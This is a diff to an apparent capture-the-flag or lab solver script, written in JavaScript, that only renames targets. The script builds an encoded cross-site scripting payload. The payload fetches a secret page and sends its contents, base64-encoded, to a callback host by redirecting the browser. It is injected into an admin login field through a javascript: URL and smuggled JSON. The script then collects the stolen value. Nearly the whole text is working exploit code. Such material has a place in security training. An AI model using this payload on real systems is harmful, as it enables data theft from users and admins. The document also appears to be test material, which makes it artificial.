@@ -58,7 +58,7 @@ async function waitForService() {
 async function main() {
   await waitForService();
 
-  const js = `fetch('/flag').then(r=>r.text()).then(t=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(t))`;
+  const js = `fetch('/review/value').then(r=>r.text()).then(t=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(t))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
 
@@ -72,7 +72,7 @@ async function main() {
     if (callbackBase.startsWith('http://127.0.0.1:1337/collect')) {
       const res = await request('GET', '/collect');
       const items = JSON.parse(res.body).items || [];
-      const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('NBL-'));
+      const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('HSS-'));
       if (found) {
         fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
         return;
@@ -92,7 +92,7 @@ async function main() {
       const rawUrl = item.url || '';
       const encodedValue = rawUrl.includes('?') ? rawUrl.split('?').pop() : '';
       const found = Buffer.from(encodedValue, 'base64').toString('utf8');
-      if (found.startsWith('NBL-')) {
+      if (found.startsWith('HSS-')) {
       fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
       return;
       }
